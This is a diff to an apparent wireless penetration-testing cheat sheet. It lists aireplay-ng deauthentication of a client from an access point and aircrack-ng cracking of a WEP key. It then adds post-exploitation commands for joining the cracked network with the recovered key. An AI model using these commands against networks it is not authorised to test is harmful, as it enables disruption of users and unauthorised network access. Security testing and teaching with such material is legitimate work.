@@ -67,6 +67,11 @@
    aireplay-ng -0 1 -a <AP_MAC> -c <Client_MAC> <interface>                                  ## performing a deauthentication attack against AP
    aircrack-ng <capture_file>                                                                ## cracking WEP key (In order to achieve a successful result, you need to catch a sufficient number of IVs during the attack.)
    
-   
+
+## Common steps after exploitation
+
+sudo airmon-ng stop wlan0mon                                                           ## Disable monitor mode
+sudo iwconfig wlan0 essid <EssidName> key <hexKey>                                     ## connect to the cracked network
+sudo dhclient wlan0                                                                    ## refresh DHCP config
 
 
